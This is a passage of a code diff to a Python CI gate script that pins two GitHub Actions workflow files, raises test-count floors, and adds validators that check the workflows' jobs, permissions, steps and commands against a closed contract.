@@ -5,42 +5,65 @@ from __future__ import annotations
 
 from dataclasses import dataclass
 from pathlib import Path
+import hashlib
+import importlib.util
+import json
+import os
 import re
+import shutil
 import subprocess
 import sys
 import tempfile
 from typing import Callable, List, Optional, Sequence, Tuple
 
+from repository_ownership import git_toplevel_error, run_git
 
-VERSION = "1.0.0"
+
+VERSION = "1.2.0"
 ROOT = Path(__file__).resolve().parent.parent
 WORKFLOW = ROOT / ".github/workflows/check.yml"
+MUTATION_WORKFLOW = ROOT / ".github/workflows/mutation-proof.yml"
 WORKFLOW_DIR = ROOT / ".github/workflows"
 # The contract pinned one file byte-for-byte and nothing enumerated the directory, so a
 # SECOND workflow -- `permissions: write-all`, `pull_request_target`, arbitrary steps --
 # ran on every push with the gate reporting the workflow contract satisfied. A CI
 # configuration is the set of files, not the one file we happen to name.
-EXPECTED_WORKFLOW_FILES = ("check.yml",)
+EXPECTED_WORKFLOW_FILES = ("check.yml", "mutation-proof.yml")
 # Every selftest suite carries a numeric floor; the eval corpus was floored only at zero,
-# so cutting 22 scenarios across 6 skills down to a single semantically empty one left the
+# so cutting 25 scenarios across 7 skills down to a single semantically empty one leaves the
 # whole gate green. Lower these in the commit that removes the scenarios.
-EVAL_SCENARIO_FLOOR = 22
-EVAL_SKILL_FLOOR = 6
+# Per skill, not a total. The aggregate floors below compare only sums, so deleting an
+# entire skill's eval corpus and adding the same number of throwaway files under any other
+# skill restored both totals and passed the whole gate. A deletion must not be maskable by
+# an addition somewhere else, so each skill's corpus is floored where it lives. Counted from
+# disk here rather than read from the child receipt, which reports only totals.
+EVAL_SCENARIO_FLOORS = {
+    "craft-context-file": 3,
+    "craft-prompt": 3,
+    "craft-skill": 3,
+    "git-workflow": 3,
+    "ground-claims": 6,
+    "outbound-drafts": 4,
+    "review-prompt": 4,
+}
+EVAL_SCENARIO_FLOOR = 26
+EVAL_SKILL_FLOOR = 7
 
 # One floor per suite, read by both the production spec table and the selftest's fake
 # runner. Two hand-maintained copies had already drifted -- render-packages was floored at
 # 165 here and 178 in harness_check -- and a fake that hardcodes its own number tests the
 # literal rather than the contract.
 SUITE_FLOORS = {
-    "harness_check": 72,
+    "harness_check": 230,
     "render-packages": 192,
-    "bash_command_guard": 111,
-    "git_grep_engine_guard": 66,
-    "zsh_rev_modifier_guard": 31,
+    "bash_command_guard": 1395,
+    "git_grep_engine_guard": 1175,
+    "zsh_rev_modifier_guard": 489,
 }
 EXPECTED_WORKFLOW = """name: harness-check
 on:
   push:
+    branches: [main]
   pull_request:
 
 permissions:
@@ -57,11 +80,70 @@ jobs:
       - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1
         with:
           persist-credentials: false
+          fetch-depth: 0
       - uses: actions/setup-python@5fda3b95a4ea91299a34e894583c3862153e4b97
         with:
           python-version: 3.13.14
-      - name: complete offline gate
-        run: python3 tools/ci-gate.py
+      - name: install zsh where the runner image omits it
+        if: runner.os == 'Linux'
+        timeout-minutes: 10
+        run: |
+          # A stalled mirror does not fail, it hangs: `update` sat on one InRelease fetch
+          # until the step budget killed it, so `|| true` never fired -- that guards against
+          # a non-zero exit, not against never exiting. Each refresh is bounded instead, and
+          # is advisory because the runner image ships package lists an install can already
+          # satisfy. `zsh --version` remains the assertion: an absent interpreter still fails
+          # this step, so resilience is not bought with coverage.
+          # No backslash continuations here: this file is pinned byte-for-byte inside a
+          # Python string literal, where a trailing backslash is a line continuation and
+          # would collapse, so the pin could never match the file.
+          APT_OPTS="-o Acquire::Retries=2 -o Acquire::http::Timeout=15"
+          for attempt in 1 2 3; do
+            sudo timeout 120 apt-get update $APT_OPTS || true
+            sudo apt-get install -y zsh && break
+            echo "apt attempt $attempt did not yield zsh; retrying"
+            sleep 10
+          done
+          zsh --version
+      - name: source-bound bootstrap and complete offline gate
+        run: |
+          python3 hooks/harness_check.py --ci
+          python3 tools/ci-gate.py
+
+  publication:
+    if: github.event_name == 'pull_request'
+    runs-on: ubuntu-24.04
+    permissions:
+      contents: read
+      pull-requests: read
+    steps:
+      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1
+        with:
+          persist-credentials: false
+      - uses: actions/setup-python@5fda3b95a4ea91299a34e894583c3862153e4b97
+        with:
+          python-version: 3.13.14
+      - name: frozen publication still matches the live pull request
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          PR_NUMBER: ${{ github.event.pull_request.number }}
+          HEAD_SHA: ${{ github.event.pull_request.head.sha }}
+        run: |
+          # The offline gate compares the manifest to a literal in the gate's own source.
+          # Both are authored records of the same numbers, so agreement between them says
+          # nothing about the artifact GitHub is serving. This step is the only place the
+          # frozen body and title are read back from the published pull request.
+          # github.sha is the MERGE commit on a pull_request event, not the branch head,
+          # and the tool compares its argument against the head the API reports; passing
+          # the merge sha would fail every run for a reason unrelated to publication.
+          # No backslash continuations: this file is pinned byte-for-byte inside a Python
+          # string literal, where a trailing backslash is a line continuation.
+          MANIFEST="contracts/review/pr-$PR_NUMBER/frozen-publication.json"
+          if [ ! -f "$MANIFEST" ]; then
+            echo "no frozen publication registered for PR $PR_NUMBER at $MANIFEST"
+            exit 1
+          fi
+          python3 tools/verify-review-publication.py pr-snapshot --repo "$GITHUB_REPOSITORY" --pr "$PR_NUMBER" --expected-head "$HEAD_SHA" --manifest "$MANIFEST"
 
   portable-conformance:
     runs-on: ubuntu-24.04
@@ -74,6 +156,124 @@ jobs:
           python-version: 3.13.14
       - name: pinned upstream conformance
         run: python3 tools/portable-conformance.py
+"""
+EXPECTED_MUTATION_WORKFLOW = """name: mutation-proof
+# The sweep re-measures every mutation to prove the committed receipt is truthful rather than
+# merely self-consistent, which is the one thing the offline gate cannot do: it recomputes
+# from the receipt's own contents and can never re-measure. It is the only check that tells a
+# real measurement from a fabricated one, so it must reach every head.
+#
+# Every accepted head is measured afresh by the same six shards. A path filter, selector, or
+# inherited receipt would leave the result dependent on unverified prior workflow and runner
+# state; absence and self-consistency are not measurement evidence.
+on:
+  pull_request:
+  push:
+    branches: [main]
+  workflow_dispatch:
+
+permissions:
+  contents: read
+
+jobs:
+  mutations:
+    strategy:
+      fail-fast: false
+      matrix:
+        shard: [0, 1, 2, 3, 4, 5]
+    runs-on: ubuntu-24.04
+    timeout-minutes: 90
+    steps:
+      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1
+        with:
+          persist-credentials: false
+          ref: ${{ github.event.pull_request.head.sha || github.sha }}
+      - uses: actions/setup-python@5fda3b95a4ea91299a34e894583c3862153e4b97
+        with:
+          python-version: 3.13.14
+      - name: install zsh and assert the exact accepted head
+        timeout-minutes: 10
+        run: |
+          # A stalled mirror does not fail, it hangs: `update` sat on one InRelease fetch
+          # until the step budget killed it, so `|| true` never fired -- that guards against
+          # a non-zero exit, not against never exiting. Each refresh is bounded instead, and
+          # is advisory because the runner image ships package lists an install can already
+          # satisfy. `zsh --version` remains the assertion: an absent interpreter still fails
+          # this step, so resilience is not bought with coverage.
+          # No backslash continuations here: this file is pinned byte-for-byte inside a
+          # Python string literal, where a trailing backslash is a line continuation and
+          # would collapse, so the pin could never match the file.
+          APT_OPTS="-o Acquire::Retries=2 -o Acquire::http::Timeout=15"
+          for attempt in 1 2 3; do
+            sudo timeout 120 apt-get update $APT_OPTS || true
+            sudo apt-get install -y zsh && break
+            echo "apt attempt $attempt did not yield zsh; retrying"
+            sleep 10
+          done
+          zsh --version
+          git rev-parse HEAD | grep -Fx '${{ github.event.pull_request.head.sha || github.sha }}'
+      - name: run mutation shard
+        run: >-
+          python3 tools/write-mutation-receipt.py
+          --shard-index ${{ matrix.shard }}
+          --shard-count 6
+          --fragment mutation-fragment-${{ matrix.shard }}.json
+          --expected-head '${{ github.event.pull_request.head.sha || github.sha }}'
+      - uses: actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02
+        with:
+          name: mutation-fragment-${{ matrix.shard }}
+          path: mutation-fragment-${{ matrix.shard }}.json
+          if-no-files-found: error
+          retention-days: 7
+
+  aggregate:
+    if: always()
+    needs: mutations
+    runs-on: ubuntu-24.04
+    timeout-minutes: 30
+    steps:
+      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1
+        with:
+          persist-credentials: false
+          ref: ${{ github.event.pull_request.head.sha || github.sha }}
+      - uses: actions/setup-python@5fda3b95a4ea91299a34e894583c3862153e4b97
+        with:
+          python-version: 3.13.14
+      - name: install zsh and assert the exact accepted head
+        timeout-minutes: 10
+        run: |
+          # A stalled mirror does not fail, it hangs: `update` sat on one InRelease fetch
+          # until the step budget killed it, so `|| true` never fired -- that guards against
+          # a non-zero exit, not against never exiting. Each refresh is bounded instead, and
+          # is advisory because the runner image ships package lists an install can already
+          # satisfy. `zsh --version` remains the assertion: an absent interpreter still fails
+          # this step, so resilience is not bought with coverage.
+          # No backslash continuations here: this file is pinned byte-for-byte inside a
+          # Python string literal, where a trailing backslash is a line continuation and
+          # would collapse, so the pin could never match the file.
+          APT_OPTS="-o Acquire::Retries=2 -o Acquire::http::Timeout=15"
+          for attempt in 1 2 3; do
+            sudo timeout 120 apt-get update $APT_OPTS || true
+            sudo apt-get install -y zsh && break
+            echo "apt attempt $attempt did not yield zsh; retrying"
+            sleep 10
+          done
+          zsh --version
+          git rev-parse HEAD | grep -Fx '${{ github.event.pull_request.head.sha || github.sha }}'
+      - name: refuse a head whose shards did not all succeed
+        if: needs.mutations.result != 'success'
+        run: |
+          echo "mutations result: ${{ needs.mutations.result }}"
+          exit 1
+      - uses: actions/download-artifact@d3f86a106a0bac45b974a628896c90dbdf5c8093
+        with:
+          pattern: mutation-fragment-*
+          path: mutation-fragments
+          merge-multiple: true
+      - name: reject incomplete evidence and compare the tracked receipt
+        run: >-
+          python3 tools/write-mutation-receipt.py
+          --aggregate mutation-fragments/*.json
 """
 
 
@@ -102,6 +302,20 @@ def _success_receipt(match: re.Match[str], returncode: int) -> Optional[str]:
     return None
 
 
+def expected_selftest_checks(suite: str) -> Optional[int]:
+    """Read the exact variable-environment count from the harness registry SSOT."""
+    try:
+        spec = importlib.util.spec_from_file_location(
+            "_ci_gate_harness_counts", ROOT / "hooks/harness_check.py")
+        if spec is None or spec.loader is None:
+            return None
+        module = importlib.util.module_from_spec(spec)
+        spec.loader.exec_module(module)
+        return module.expected_selftest_checks(suite)
+    except Exception:
+        return None
+
+
 def selftest_receipt(suite: str, floor: int) -> ReceiptSpec:
     pattern = re.compile(
         rf"^SELFTEST-SUMMARY suite=(?P<suite>[a-z0-9_-]+) "
@@ -113,6 +327,9 @@ def selftest_receipt(suite: str, floor: int) -> ReceiptSpec:
             return f"wrong suite id {match.group('suite')!r}, expected {suite!r}"
         checks = int(match.group("checks"))
         failures = int(match.group("failures"))
+        exact = expected_selftest_checks(suite)
+        if exact is not None and checks != exact:
+            return f"checks={checks}, expected exact execution count={exact}"
         if checks < floor:
             return f"checks={checks} below floor={floor}"
         if failures != 0 or returncode != 0:
@@ -136,24 +353,572 @@ def validate_receipt(result: Result, spec: ReceiptSpec) -> Optional[str]:
     return spec.validate(matches[0], result.returncode)
 
 
-def workflow_error(data: str) -> Optional[str]:
+def workflow_error(data: str, mutation_data: Optional[str] = None) -> Optional[str]:
+    if mutation_data is None:
+        mutation_data = EXPECTED_MUTATION_WORKFLOW
     if data != EXPECTED_WORKFLOW:
         return (
             "workflow differs from the closed contract: two explicit OS targets, Python "
             "3.13.14, full action SHAs, read-only permissions, non-persisted checkout "
-            "credentials, one ci-gate command, and one conformance command"
+            "credentials, a Linux-only zsh install whose own version call proves it "
+            "landed, one ci-gate command, and one conformance command"
+        )
+    if mutation_data != EXPECTED_MUTATION_WORKFLOW:
+        return (
+            "mutation workflow differs from the closed contract: every accepted head "
+            "runs six deterministic shards at the exact head, with read-only permissions, "
+            "immutable actions, artifact aggregation, and tracked-receipt comparison"
         )
     return None
 
 
-def run_command(argv: Sequence[str]) -> Result:
-    completed = subprocess.run(
-        list(argv),
-        cwd=ROOT,
-        capture_output=True,
-        text=True,
-        timeout=120,
+def _yaml_mapping_block(data: str, header: str) -> str:
+    """Return one indentation-delimited mapping block, or an empty string."""
+    lines = data.splitlines(keepends=True)
+    matches = [index for index, line in enumerate(lines) if line.rstrip("\r\n") == header]
+    if len(matches) != 1:
+        return ""
+    start = matches[0]
+    indentation = len(header) - len(header.lstrip(" "))
+    end = start + 1
+    while end < len(lines):
+        content = lines[end].rstrip("\r\n")
+        if content and len(content) - len(content.lstrip(" ")) <= indentation:
+            break
+        end += 1
+    return "".join(lines[start:end])
+
+
+def _yaml_fields(block: str, indentation: int) -> list[str]:
+    """Return non-comment fields at one exact indentation inside a closed block."""
+    return [
+        line.strip()
+        for line in block.splitlines()[1:]
+        if line.strip() and not line.lstrip().startswith("#")
+        and len(line) - len(line.lstrip(" ")) == indentation
+    ]
+
+
+def _yaml_step_headers(block: str) -> list[str]:
+    return [
+        line.strip()
+        for line in block.splitlines()
+        if line.strip() and not line.lstrip().startswith("#")
+        and len(line) - len(line.lstrip(" ")) == 6
+        and (line.strip() == "-" or line.strip().startswith("- "))
+    ]
+
+
+def _folded_command(step: str) -> tuple[str, ...]:
+    """Return every line of a folded `run: >-` block, comments included.
+
+    YAML recognises no comment inside a block scalar, so a `#`-leading line there is
+    content: folding joins it to the command with a space and the shell then treats the
+    whole folded line as a comment. Dropping those lines the way a literal `run: |` block
+    allows -- where `#` really is a shell comment -- let one inserted line turn the sweep's
+    receipt comparison into a no-op that exits zero while this oracle read the command it
+    expected. Every line is returned, so an inserted one changes the tuple and is refused.
+    """
+    return tuple(
+        line.strip()
+        for line in _yaml_mapping_block(step, "        run: >-").splitlines()[1:]
+        if line.strip()
     )
+
+
+def _yaml_run_commands(step: str) -> tuple[str, ...]:
+    run_block = _yaml_mapping_block(step, "        run: |")
+    return tuple(
+        line.strip()
+        for line in run_block.splitlines()[1:]
+        if line.strip() and not line.lstrip().startswith("#")
+    )
+
+
+def sibling_workflow_jobs_error(data: str) -> str:
+    """Independently close the check and portable-conformance job authority."""
+    checkout = "actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1"
+    setup = "actions/setup-python@5fda3b95a4ea91299a34e894583c3862153e4b97"
+
+    check = _yaml_mapping_block(data, "  check:")
+    if not check:
+        return "check workflow job is absent or duplicated"
+    if _yaml_fields(check, 4) != ["strategy:", "runs-on: ${{ matrix.os }}", "steps:"]:
+        return "check workflow job fields are not exactly the closed contract"
+    strategy = _yaml_mapping_block(check, "    strategy:")
+    if _yaml_fields(strategy, 6) != ["fail-fast: false", "matrix:"]:
+        return "check workflow strategy is not exactly fail-fast with one matrix"
+    matrix = _yaml_mapping_block(strategy, "      matrix:")
+    if _yaml_fields(matrix, 8) != ["os: [ubuntu-24.04, macos-15]"]:
+        return "check workflow OS matrix is not exactly the two reviewed runners"
+    if _yaml_step_headers(check) != [
+            f"- uses: {checkout}", f"- uses: {setup}",
+            "- name: install zsh where the runner image omits it",
+            "- name: source-bound bootstrap and complete offline gate"]:
+        return "check workflow step inventory is not exactly ordered and closed"
+
+    checkout_step = _yaml_mapping_block(check, f"      - uses: {checkout}")
+    checkout_with = _yaml_mapping_block(checkout_step, "        with:")
+    if (_yaml_fields(checkout_step, 8) != ["with:"]
+            or _yaml_fields(checkout_with, 10) != [
+                "persist-credentials: false", "fetch-depth: 0"]):
+        return "check workflow checkout step is not exactly full-history and non-persisting"
+    setup_step = _yaml_mapping_block(check, f"      - uses: {setup}")
+    setup_with = _yaml_mapping_block(setup_step, "        with:")
+    if (_yaml_fields(setup_step, 8) != ["with:"]
+            or _yaml_fields(setup_with, 10) != ["python-version: 3.13.14"]):
+        return "check workflow setup-python step is not exactly unconditional"
+    zsh_step = _yaml_mapping_block(
+        check, "      - name: install zsh where the runner image omits it")
+    if _yaml_fields(zsh_step, 8) != [
+            "if: runner.os == 'Linux'", "timeout-minutes: 10", "run: |"]:
+        return "check workflow zsh step fields are not exactly Linux-only and bounded"
+    if _yaml_run_commands(zsh_step) != (
+            'APT_OPTS="-o Acquire::Retries=2 -o Acquire::http::Timeout=15"',
+            "for attempt in 1 2 3; do",
+            "sudo timeout 120 apt-get update $APT_OPTS || true",
+            "sudo apt-get install -y zsh && break",
+            'echo "apt attempt $attempt did not yield zsh; retrying"',
+            "sleep 10", "done", "zsh --version"):
+        return "check workflow zsh command sequence is not exactly bounded and asserted"
+    gate_step = _yaml_mapping_block(
+        check, "      - name: source-bound bootstrap and complete offline gate")
+    if (_yaml_fields(gate_step, 8) != ["run: |"]
+            or _yaml_run_commands(gate_step) != (
+                "python3 hooks/harness_check.py --ci",
+                "python3 tools/ci-gate.py")):
+        return "check workflow gate command sequence is not exactly source-bound and complete"
+
+    portable = _yaml_mapping_block(data, "  portable-conformance:")
+    if not portable:
+        return "portable-conformance workflow job is absent or duplicated"
+    if _yaml_fields(portable, 4) != ["runs-on: ubuntu-24.04", "steps:"]:
+        return "portable-conformance workflow job fields are not exactly the closed contract"
+    if _yaml_step_headers(portable) != [
+            f"- uses: {checkout}", f"- uses: {setup}",
+            "- name: pinned upstream conformance"]:
+        return "portable-conformance step inventory is not exactly ordered and closed"
+    portable_checkout = _yaml_mapping_block(portable, f"      - uses: {checkout}")
+    portable_checkout_with = _yaml_mapping_block(portable_checkout, "        with:")
+    if (_yaml_fields(portable_checkout, 8) != ["with:"]
+            or _yaml_fields(portable_checkout_with, 10) != [
+                "persist-credentials: false"]):
+        return "portable-conformance checkout step is not exactly non-persisting"
+    portable_setup = _yaml_mapping_block(portable, f"      - uses: {setup}")
+    portable_setup_with = _yaml_mapping_block(portable_setup, "        with:")
+    if (_yaml_fields(portable_setup, 8) != ["with:"]
+            or _yaml_fields(portable_setup_with, 10) != ["python-version: 3.13.14"]):
+        return "portable-conformance setup-python step is not exactly unconditional"
+    portable_run = _yaml_mapping_block(
+        portable, "      - name: pinned upstream conformance")
+    if _yaml_fields(portable_run, 8) != [
+            "run: python3 tools/portable-conformance.py"]:
+        return "portable-conformance command is not exactly the reviewed executable"
+    return ""
+
+
+def mutation_workflow_authority_error(data: str) -> str:
+    """Independently close the sweep workflow's authority, jobs, steps, and commands.
+
+    The only authority this workflow carried was a byte comparison against a constant in this
+    file, so three coordinated edits -- the workflow, that constant, and the tracked source
+    digest -- moved together and left the whole gate green while a widened token, an appended
+    job, an inserted step, or a changed shard count reached the runner. Nothing below reads
+    that constant: an oracle that consults the bytes it exists to second-guess repeats them.
+    """
+    checkout = "actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1"
+    setup = "actions/setup-python@5fda3b95a4ea91299a34e894583c3862153e4b97"
+    upload = "actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02"
+    download = "actions/download-artifact@d3f86a106a0bac45b974a628896c90dbdf5c8093"
+    head = "${{ github.event.pull_request.head.sha || github.sha }}"
+
+    top_fields = [
+        line.strip()
+        for line in data.splitlines()
+        if line.strip() and not line.lstrip().startswith("#")
+        and len(line) - len(line.lstrip(" ")) == 0
+    ]
+    if top_fields != ["name: mutation-proof", "on:", "permissions:", "jobs:"]:
+        return "mutation workflow top-level fields permit an unreviewed environment"
+    # The key alone leaves the block's CONTENT unread, and neither job overrides it, so a
+    # widened workflow-level token reaches every shard and the aggregator silently.
+    granted = [
+        line.strip()
+        for line in _yaml_mapping_block(data, "permissions:").splitlines()[1:]
+        if line.strip() and not line.lstrip().startswith("#")
+    ]
+    if granted != ["contents: read"]:
+        return "mutation workflow top-level permissions are not exactly contents:read"
+    trigger = _yaml_mapping_block(data, "on:")
+    if _yaml_fields(trigger, 2) != ["pull_request:", "push:", "workflow_dispatch:"]:
+        return "mutation workflow trigger inventory is not exactly the three reviewed events"
+    if _yaml_fields(_yaml_mapping_block(trigger, "  push:"), 4) != ["branches: [main]"]:
+        return "mutation workflow push trigger is not exactly main"
+    # A selector on either unfiltered event silences the sweep for the heads it excludes, and
+    # the absence of a measurement is not a measurement.
+    for event in ("  pull_request:", "  workflow_dispatch:"):
+        if any(line.strip()
+               for line in _yaml_mapping_block(trigger, event).splitlines()[1:]):
+            return f"mutation workflow {event.strip(' :')} trigger is filtered"
+
+    # Both job lookups precede the inventory so a duplicated job keeps its own diagnosis
+    # instead of being answered by the inventory.
+    shard = _yaml_mapping_block(data, "  mutations:")
+    if not shard:
+        return "mutation shard job is absent or duplicated"
+    aggregate = _yaml_mapping_block(data, "  aggregate:")
+    if not aggregate:
+        return "mutation aggregate job is absent or duplicated"
+    # The jobs mapping is append-open to every closed list built below, because those cover
+    # one named block each and never the mapping that may carry a third sibling.
+    jobs = _yaml_mapping_block(data, "jobs:")
+    job_names = [
+        line.strip()
+        for line in jobs.splitlines()[1:]
+        if line.strip() and not line.lstrip().startswith("#")
+        and len(line) - len(line.lstrip(" ")) == 2
+    ]
+    if job_names != ["mutations:", "aggregate:"]:
+        return "mutation workflow job inventory is not exactly closed"
+
+    if _yaml_fields(shard, 4) != [
+            "strategy:", "runs-on: ubuntu-24.04", "timeout-minutes: 90", "steps:"]:
+        return "mutation shard job fields are not exactly the closed contract"
+    strategy = _yaml_mapping_block(shard, "    strategy:")
+    if _yaml_fields(strategy, 6) != ["fail-fast: false", "matrix:"]:
+        return "mutation shard strategy is not exactly fail-fast with one matrix"
+    matrix = _yaml_mapping_block(strategy, "      matrix:")
+    if _yaml_fields(matrix, 8) != ["shard: [0, 1, 2, 3, 4, 5]"]:
+        return "mutation shard matrix is not exactly the six reviewed shards"
+    if _yaml_step_headers(shard) != [
+            f"- uses: {checkout}", f"- uses: {setup}",
+            "- name: install zsh and assert the exact accepted head",
+            "- name: run mutation shard", f"- uses: {upload}"]:
+        return "mutation shard step inventory is not exactly ordered and closed"
+    if _yaml_fields(aggregate, 4) != [
+            "if: always()", "needs: mutations", "runs-on: ubuntu-24.04",
+            "timeout-minutes: 30", "steps:"]:
+        return "mutation aggregate job fields are not exactly the closed contract"
+    if _yaml_step_headers(aggregate) != [
+            f"- uses: {checkout}", f"- uses: {setup}",
+            "- name: install zsh and assert the exact accepted head",
+            "- name: refuse a head whose shards did not all succeed",
+            f"- uses: {download}",
+            "- name: reject incomplete evidence and compare the tracked receipt"]:
+        return "mutation aggregate step inventory is not exactly ordered and closed"
+
+    for label, job in (("shard", shard), ("aggregate", aggregate)):
+        checkout_step = _yaml_mapping_block(job, f"      - uses: {checkout}")
+        checkout_with = _yaml_mapping_block(checkout_step, "        with:")
+        if (_yaml_fields(checkout_step, 8) != ["with:"]
+                or _yaml_fields(checkout_with, 10) != [
+                    "persist-credentials: false", f"ref: {head}"]):
+            return (f"mutation {label} checkout step is not exactly non-persisting at the "
+                    "accepted head")
+        setup_step = _yaml_mapping_block(job, f"      - uses: {setup}")
+        setup_with = _yaml_mapping_block(setup_step, "        with:")
+        if (_yaml_fields(setup_step, 8) != ["with:"]
+                or _yaml_fields(setup_with, 10) != ["python-version: 3.13.14"]):
+            return f"mutation {label} setup-python step is not exactly unconditional"
+        zsh_step = _yaml_mapping_block(
+            job, "      - name: install zsh and assert the exact accepted head")
+        if _yaml_fields(zsh_step, 8) != ["timeout-minutes: 10", "run: |"]:
+            return f"mutation {label} zsh step fields are not exactly bounded"
+        if _yaml_run_commands(zsh_step) != (
+                'APT_OPTS="-o Acquire::Retries=2 -o Acquire::http::Timeout=15"',
+                "for attempt in 1 2 3; do",
+                "sudo timeout 120 apt-get update $APT_OPTS || true",
+                "sudo apt-get install -y zsh && break",
+                'echo "apt attempt $attempt did not yield zsh; retrying"',
+                "sleep 10", "done", "zsh --version",
+                f"git rev-parse HEAD | grep -Fx '{head}'"):
+            return (f"mutation {label} zsh command sequence is not exactly bounded and "
+                    "head-asserted")
+
+    receipt_step = _yaml_mapping_block(shard, "      - name: run mutation shard")
+    if _yaml_fields(receipt_step, 8) != ["run: >-"]:
+        return "mutation shard receipt step fields are not exactly one folded command"
+    receipt_command = _folded_command(receipt_step)
+    if receipt_command != (
+            "python3 tools/write-mutation-receipt.py",
+            "--shard-index ${{ matrix.shard }}",
+            "--shard-count 6",
+            "--fragment mutation-fragment-${{ matrix.shard }}.json",
+            f"--expected-head '{head}'"):
+        return "mutation shard receipt command is not exactly the six-way sharded writer"
+    upload_step = _yaml_mapping_block(shard, f"      - uses: {upload}")
+    upload_with = _yaml_mapping_block(upload_step, "        with:")
+    if (_yaml_fields(upload_step, 8) != ["with:"]
+            or _yaml_fields(upload_with, 10) != [
+                "name: mutation-fragment-${{ matrix.shard }}",
+                "path: mutation-fragment-${{ matrix.shard }}.json",
+                "if-no-files-found: error", "retention-days: 7"]):
+        return "mutation shard fragment upload is not exactly the reviewed evidence upload"
+
+    refusal_step = _yaml_mapping_block(
+        aggregate, "      - name: refuse a head whose shards did not all succeed")
+    if _yaml_fields(refusal_step, 8) != [
+            "if: needs.mutations.result != 'success'", "run: |"]:
+        return "mutation aggregate shard-failure gate fields are not the closed refusal"
+    if _yaml_run_commands(refusal_step) != (
+            'echo "mutations result: ${{ needs.mutations.result }}"', "exit 1"):
+        return "mutation aggregate shard-failure gate does not exit non-zero"
+    download_step = _yaml_mapping_block(aggregate, f"      - uses: {download}")
+    download_with = _yaml_mapping_block(download_step, "        with:")
+    if (_yaml_fields(download_step, 8) != ["with:"]
+            or _yaml_fields(download_with, 10) != [
+                "pattern: mutation-fragment-*", "path: mutation-fragments",
+                "merge-multiple: true"]):
+        return "mutation aggregate fragment download is not exactly the reviewed pattern"
+    comparison_step = _yaml_mapping_block(
+        aggregate,
+        "      - name: reject incomplete evidence and compare the tracked receipt")
+    if _yaml_fields(comparison_step, 8) != ["run: >-"]:
+        return "mutation aggregate comparison step fields are not one folded command"
+    comparison_command = _folded_command(comparison_step)
+    if comparison_command != (
+            "python3 tools/write-mutation-receipt.py",
+            "--aggregate mutation-fragments/*.json"):
+        return "mutation aggregate comparison command is not tracked-receipt aggregation"
+    return ""
+
+
+def publication_workflow_error(data: str) -> str:
+    """Independently close all workflow jobs and the live publication read-back."""
+    top_fields = [
+        line.strip()
+        for line in data.splitlines()
+        if line.strip() and not line.lstrip().startswith("#")
+        and len(line) - len(line.lstrip(" ")) == 0
+    ]
+    if top_fields != ["name: harness-check", "on:", "permissions:", "jobs:"]:
+        return "publication workflow top-level fields permit an unreviewed environment"
+    # The key list alone left the block's CONTENT unread, so contents:read could become
+    # contents:write with this function still returning clean. The publication job overrides
+    # workflow-level permissions with its own block, but check and portable-conformance
+    # inherit, so a widened token reaches them silently.
+    workflow_permissions = _yaml_mapping_block(data, "permissions:")
+    granted = [
+        line.strip()
+        for line in workflow_permissions.splitlines()[1:]
+        if line.strip() and not line.lstrip().startswith("#")
+    ]
+    if granted != ["contents: read"]:
+        return "publication workflow top-level permissions are not exactly contents:read"
+    trigger = _yaml_mapping_block(data, "on:")
+    if _yaml_fields(trigger, 2) != ["push:", "pull_request:"]:
+        return "publication workflow trigger inventory is not exactly push-main and pull-request"
+    push = _yaml_mapping_block(trigger, "  push:")
+    if _yaml_fields(push, 4) != ["branches: [main]"]:
+        return "publication workflow push trigger is not exactly main"
+    pull_request = _yaml_mapping_block(trigger, "  pull_request:") if trigger else ""
+    if any(line.strip() for line in pull_request.splitlines()[1:]):
+        return "publication workflow pull_request trigger is filtered"
+    sibling_problem = sibling_workflow_jobs_error(data)
+    if sibling_problem:
+        return sibling_problem
+
+    publication = _yaml_mapping_block(data, "  publication:")
+    if not publication:
+        return "publication workflow job is absent or duplicated"
+    # The jobs mapping was append-open: a sibling job carrying its own write permissions was
+    # invisible here. The byte tripwire caught it, but being independent of the byte tripwire is
+    # this function's purpose. Ordered after the lookup above so a duplicated publication: keeps
+    # its own diagnosis instead of being answered by the inventory.
+    jobs = _yaml_mapping_block(data, "jobs:")
+    job_names = [
+        line.strip()
+        for line in jobs.splitlines()[1:]
+        if line.strip() and not line.lstrip().startswith("#")
+        and len(line) - len(line.lstrip(" ")) == 2
+    ]
+    if job_names != ["check:", "publication:", "portable-conformance:"]:
+        return "publication workflow job inventory is not exactly closed"
+    job_fields = [
+        line.strip()
+        for line in publication.splitlines()[1:]
+        if line.strip() and not line.lstrip().startswith("#")
+        and len(line) - len(line.lstrip(" ")) == 4
+    ]
+    if job_fields != [
+            "if: github.event_name == 'pull_request'", "runs-on: ubuntu-24.04",
+            "permissions:", "steps:"]:
+        return "publication workflow job fields are not exactly the closed contract"
+    required_once = (
+        ("    if: github.event_name == 'pull_request'\n", "pull-request job condition"),
+        ("    runs-on: ubuntu-24.04\n", "runner"),
+        ("      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1\n",
+         "pinned checkout action"),
+        ("          persist-credentials: false\n", "non-persisted checkout credentials"),
+        ("      - uses: actions/setup-python@5fda3b95a4ea91299a34e894583c3862153e4b97\n",
+         "pinned setup-python action"),
+        ("          python-version: 3.13.14\n", "Python version"),
+        ("          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}\n", "GitHub token binding"),
+        ("          PR_NUMBER: ${{ github.event.pull_request.number }}\n",
+         "pull-request number binding"),
+        ("          HEAD_SHA: ${{ github.event.pull_request.head.sha }}\n",
+         "pull-request head binding"),
+        ('          MANIFEST="contracts/review/pr-$PR_NUMBER/frozen-publication.json"\n',
+         "PR-scoped publication manifest"),
+        ('          if [ ! -f "$MANIFEST" ]; then\n', "unregistered-PR manifest branch"),
+        ('            exit 1\n', "unregistered-PR manifest exit"),
+        ("python3 tools/verify-review-publication.py ", "publication verifier executable"),
+        ("tools/verify-review-publication.py pr-snapshot", "snapshot verifier mode"),
+        ('--repo "$GITHUB_REPOSITORY"', "repository argument"),
+        ('--pr "$PR_NUMBER"', "pull-request argument"),
+        ('--expected-head "$HEAD_SHA"', "head argument"),
